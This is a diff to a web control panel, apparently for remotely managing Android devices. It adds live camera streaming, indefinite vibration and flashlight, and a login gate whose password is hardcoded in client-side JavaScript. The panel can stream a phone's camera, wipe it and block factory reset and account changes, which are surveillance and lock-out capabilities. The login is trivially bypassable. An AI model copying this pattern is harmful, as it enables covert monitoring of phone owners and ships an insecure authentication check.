@@ -27,7 +27,32 @@
             line-height: 1.5;
         }
 
-        .container { max-width: 1200px; margin: 0 auto; }
+        /* Login Overlay */
+        #loginContainer {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .login-card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .login-card h2 { border: none; margin-bottom: 20px; }
+        .login-card input { margin-bottom: 15px; text-align: center; font-size: 1rem; }
+
+        .container { max-width: 1200px; margin: 0 auto; display: none; }
 
         header {
             text-align: center;
@@ -140,16 +165,47 @@
             border: 1px solid #064e3b;
         }
 
-        .live-screen {
+        .live-screen-container {
             width: 100%;
-            border-radius: 8px;
             background: #000;
             margin-top: 10px;
-            aspect-ratio: auto;
-            max-height: 70vh;
-            object-fit: contain;
+            border-radius: 8px;
+            overflow: hidden;
             border: 1px solid var(--border);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            aspect-ratio: 3/4;
         }
+
+        #liveScreen {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            display: none;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(56, 189, 248, 0.1);
+            border-left-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+            position: absolute;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .rotate-0 { transform: rotate(0deg); }
+        .rotate-90 { transform: rotate(90deg); }
+        .rotate-180 { transform: rotate(180deg); }
+        .rotate-270 { transform: rotate(270deg); }
 
         .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; }
         .status-online { background-color: var(--success); box-shadow: 0 0 8px var(--success); }
@@ -226,7 +282,17 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- Login Section -->
+    <div id="loginContainer">
+        <div class="login-card">
+            <h2>🔐 ACCESS CONTROL</h2>
+            <input type="password" id="accessPass" placeholder="Enter Password" onkeypress="if(event.key==='Enter') verifyAccess()">
+            <button class="action" style="width: 100%; padding: 12px;" onclick="verifyAccess()">LOGIN</button>
+            <p id="loginMsg" style="color: var(--danger); margin-top: 10px; font-size: 0.8rem; display: none;">Invalid Password!</p>
+        </div>
+    </div>
+
+    <div class="container" id="mainUI">
         <header>
             <h1>
                 <span id="connectionStatus" class="status-dot status-offline"></span>
@@ -257,18 +323,23 @@
                 <div class="card">
                     <h2>Live View & Camera</h2>
                     <div style="margin-bottom: 15px;">
-                        <label>Select Camera Source</label>
-                        <select id="cameraIdSelect" style="margin-top:5px; margin-bottom:10px;">
-                            <option value="0">Back Camera (0)</option>
-                            <option value="1">Front Camera (1)</option>
-                            <option value="2">Other (2)</option>
-                        </select>
+                        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+                            <select id="cameraIdSelect" style="flex: 2;">
+                                <option value="0">Back Camera (0)</option>
+                                <option value="1">Front Camera (1)</option>
+                                <option value="2">Other (2)</option>
+                            </select>
+                            <button class="action" style="flex: 1;" onclick="cycleRotation()">Rotate ↻</button>
+                        </div>
                         <div class="btn-toggle">
-                            <button class="action" style="flex:1" onclick="sendCommand('live_camera', {enabled: true, cameraId: document.getElementById('cameraIdSelect').value})">Start Feed</button>
-                            <button style="flex:1" onclick="sendCommand('live_camera', {enabled: false})">Stop Feed</button>
+                            <button id="btn_feed_start" class="action" style="flex:1" onclick="handleCameraToggle(true)">Start Feed</button>
+                            <button id="btn_feed_stop" style="flex:1" onclick="handleCameraToggle(false)">Stop Feed</button>
                         </div>
                     </div>
-                    <img id="liveScreen" class="live-screen" src="" alt="Stream Offline" />
+                    <div class="live-screen-container">
+                        <div id="camSpinner" class="spinner"></div>
+                        <img id="liveScreen" class="rotate-0" src="" alt="Stream Offline" />
+                    </div>
                 </div>
 
                 <!-- Immediate Actions -->
@@ -280,10 +351,15 @@
                         <button style="flex: 1; background: #991b1b;" onclick="safeWipe()">WIPE</button>
                     </div>
                     <hr>
-                    <label>Force Vibration</label>
-                    <div class="vibrate-box" style="margin-top:5px;">
-                        <input type="number" id="vibDur" placeholder="ms" value="1000">
-                        <button class="action" onclick="sendCommand('vibrate', {duration: parseInt(document.getElementById('vibDur').value)})">Vibrate</button>
+                    <div class="control-group" style="flex-direction: column; align-items: stretch; border-bottom: none; padding-bottom: 0;">
+                        <label>Vibration Control</label>
+                        <div class="flex-row" style="margin-top:5px;">
+                            <input type="number" id="vibrateDur" placeholder="ms (empty=forever)">
+                            <div class="btn-toggle">
+                                <button id="btn_vibrate_on" onclick="handleVibrate(true)">ON</button>
+                                <button id="btn_vibrate_off" onclick="handleVibrate(false)">OFF</button>
+                            </div>
+                        </div>
                     </div>
                 </div>
 
@@ -365,11 +441,14 @@
                             <button id="btn_bluetooth_block" onclick="sendCommand('bluetooth_disable', {disabled: true})">Block</button>
                         </div>
                     </div>
-                    <div class="control-group">
-                        <label>Flashlight</label>
-                        <div class="btn-toggle">
-                            <button id="btn_flashlight_on" onclick="sendCommand('flashlight', {enabled: true})">ON</button>
-                            <button id="btn_flashlight_off" onclick="sendCommand('flashlight', {enabled: false})">OFF</button>
+                    <div class="control-group" style="flex-direction: column; align-items: stretch; border-bottom: none;">
+                        <label>Flashlight Control</label>
+                        <div class="flex-row" style="margin-top:5px;">
+                            <input type="number" id="flashlightDur" placeholder="ms (empty=forever)">
+                            <div class="btn-toggle">
+                                <button id="btn_flashlight_on" onclick="handleFlashlight(true)">ON</button>
+                                <button id="btn_flashlight_off" onclick="handleFlashlight(false)">OFF</button>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -405,12 +484,6 @@
                             <option value="AUTOMATIC">Auto</option>
                             <option value="POSTPONE">Postpone</option>
                         </select>
-                    </div>
-                    <hr>
-                    <label>Reset Screen Lock (PIN)</label>
-                    <div class="flex-row" style="margin-top:5px;">
-                        <input type="text" id="newPin" placeholder="Enter PIN" value="0000">
-                        <button class="action" onclick="sendCommand('reset_password', {password: document.getElementById('newPin').value})">Set PIN</button>
                     </div>
                 </div>
 
@@ -500,6 +573,23 @@
         const NGROK_HEADERS = { 'ngrok-skip-browser-warning': 'true' };
         let lastCommandTimestamp = 0;
         const SYNC_COOLDOWN = 8000;
+        let rotationDegrees = 0;
+        let isFeedEnabled = false;
+        let isInitialFrameReceived = false;
+
+        function verifyAccess() {
+            const pass = document.getElementById('accessPass').value;
+            if (pass === 'Hamza@1234') {
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('mainUI').style.display = 'block';
+                loadDevices();
+                setInterval(loadDevices, 10000);
+                setInterval(fetchDeviceData, 4000);
+            } else {
+                document.getElementById('loginMsg').style.display = 'block';
+                setTimeout(() => { document.getElementById('loginMsg').style.display = 'none'; }, 2000);
+            }
+        }
 
         function showError(msg) {
             const el = document.getElementById('errorLog');
@@ -509,6 +599,40 @@
 
         function hideError() {
             document.getElementById('errorLog').style.display = 'none';
+        }
+
+        function cycleRotation() {
+            rotationDegrees = (rotationDegrees + 90) % 360;
+            const img = document.getElementById('liveScreen');
+            img.className = 'rotate-' + rotationDegrees;
+        }
+
+        async function handleCameraToggle(enable) {
+            const camId = document.getElementById('cameraIdSelect').value;
+            const spinner = document.getElementById('camSpinner');
+            const img = document.getElementById('liveScreen');
+
+            if (enable) {
+                isFeedEnabled = true;
+                isInitialFrameReceived = false;
+                spinner.style.display = 'block';
+                img.style.display = 'none';
+                img.src = "";
+                await sendCommand('live_camera', {enabled: true, cameraId: camId});
+                if (!window.streamLoopRunning) {
+                    window.streamLoopRunning = true;
+                    updateLiveStream();
+                }
+            } else {
+                isFeedEnabled = false;
+                spinner.style.display = 'none';
+                img.style.display = 'none';
+                img.src = "";
+                await sendCommand('live_camera', {enabled: false});
+            }
+
+            document.getElementById('btn_feed_start').className = enable ? 'action active-on' : 'action';
+            document.getElementById('btn_feed_stop').className = enable ? '' : 'active-off';
         }
 
         async function loadDevices() {
@@ -588,6 +712,7 @@
                         updateButton('btn_wifi_allow', 'btn_wifi_block', s.wifiDisabled);
                         updateButton('btn_bluetooth_allow', 'btn_bluetooth_block', s.bluetoothDisabled);
                         updateToggle('btn_flashlight_on', 'btn_flashlight_off', s.flashlight);
+                        updateToggle('btn_vibrate_on', 'btn_vibrate_off', s.vibrating);
                         updateButton('btn_google_allow', 'btn_google_block', s.googleBlocked);
                         updateButton('btn_accounts_allow', 'btn_accounts_block', s.googleAccountDisabled);
                         updateButton('btn_factory_allow', 'btn_factory_block', s.factoryResetBlocked);
@@ -596,15 +721,46 @@
                         updateToggle('btn_kiosk_on', 'btn_kiosk_off', s.kioskModeEnabled);
                         updateToggle('btn_stayon_on', 'btn_stayon_off', s.stayOnWhilePluggedIn);
                         if (s.updatePolicy) document.getElementById('updatePolicy').value = s.updatePolicy;
+
+                        if (s.isStreaming !== isFeedEnabled) {
+                            if (!s.isStreaming) handleCameraToggle(false);
+                        }
                     }
                     hideError();
                 }
             } catch (e) { document.getElementById('connectionStatus').className = 'status-dot status-offline'; }
         }
 
+        function handleFlashlight(on) {
+            const dur = document.getElementById('flashlightDur').value;
+            sendCommand('flashlight', { enabled: on, duration: (on && dur) ? parseInt(dur) : (on ? -1 : 0) });
+        }
+
+        function handleVibrate(on) {
+            const dur = document.getElementById('vibrateDur').value;
+            sendCommand('vibrate', { enabled: on, duration: (on && dur) ? parseInt(dur) : (on ? -1 : 0) });
+        }
+
         async function sendCommand(action, params = {}) {
             const deviceId = document.getElementById('deviceSelect').value;
             if (!deviceId) return alert("Select device");
+
+            try {
+                if (action === 'camera') updateButton('btn_camera_allow', 'btn_camera_block', params.disabled);
+                if (action === 'location_disable') updateButton('btn_location_allow', 'btn_location_block', params.disabled);
+                if (action === 'wifi_disable') updateButton('btn_wifi_allow', 'btn_wifi_block', params.disabled);
+                if (action === 'bluetooth_disable') updateButton('btn_bluetooth_allow', 'btn_bluetooth_block', params.disabled);
+                if (action === 'flashlight') updateToggle('btn_flashlight_on', 'btn_flashlight_off', params.enabled);
+                if (action === 'vibrate') updateToggle('btn_vibrate_on', 'btn_vibrate_off', params.enabled);
+                if (action === 'google_services') updateButton('btn_google_allow', 'btn_google_block', params.block);
+                if (action === 'account_management_disable') updateButton('btn_accounts_allow', 'btn_accounts_block', params.disabled);
+                if (action === 'factory_reset_block') updateButton('btn_factory_allow', 'btn_factory_block', params.block);
+                if (action === 'status_bar_disable') updateButton('btn_statusbar_allow', 'btn_statusbar_block', params.disabled);
+                if (action === 'keyguard_disable') updateButton('btn_keyguard_allow', 'btn_keyguard_block', params.disabled);
+                if (action === 'kiosk_mode') updateToggle('btn_kiosk_on', 'btn_kiosk_off', params.enabled);
+                if (action === 'stay_on') updateToggle('btn_stayon_on', 'btn_stayon_off', params.enabled);
+            } catch (e) { console.warn("Optimistic update failed", e); }
+
             if (action === 'list_apps') {
                 document.getElementById('appListArea').style.display = 'block';
                 document.getElementById('appListArea').innerHTML = '<div style="padding:10px; color:var(--accent);">Fetching...</div>';
@@ -640,7 +796,12 @@
         let isFetchingFrame = false;
         let currentBlobUrl = null;
         async function updateLiveStream() {
+            if (!isFeedEnabled) {
+                window.streamLoopRunning = false;
+                return;
+            }
             if (isFetchingFrame) return;
+
             const deviceId = document.getElementById('deviceSelect').value;
             if (deviceId && document.getElementById('controls').style.display !== 'none') {
                 isFetchingFrame = true;
@@ -650,16 +811,31 @@
                         const blob = await res.blob();
                         if (currentBlobUrl) URL.revokeObjectURL(currentBlobUrl);
                         currentBlobUrl = URL.createObjectURL(blob);
-                        document.getElementById('liveScreen').src = currentBlobUrl;
+
+                        const img = document.getElementById('liveScreen');
+                        const spinner = document.getElementById('camSpinner');
+
+                        img.src = currentBlobUrl;
+
+                        if (!isInitialFrameReceived) {
+                            isInitialFrameReceived = true;
+                            spinner.style.display = 'none';
+                            img.style.display = 'block';
+                        }
                     }
-                } catch (e) {} finally { isFetchingFrame = false; }
+                } catch (e) {} finally {
+                    isFetchingFrame = false;
+                    requestAnimationFrame(updateLiveStream);
+                }
+            } else {
+                isFetchingFrame = false;
+                setTimeout(updateLiveStream, 500);
             }
         }
+         setInterval(loadDevices, 10000);
+         setInterval(fetchDeviceData, 4000);
 
-        setInterval(loadDevices, 10000);
-        setInterval(fetchDeviceData, 4000);
-        setInterval(updateLiveStream, 200); // Faster polling for smoother UI
-        loadDevices();
+         loadDevices();
     </script>
 </body>
 </html>
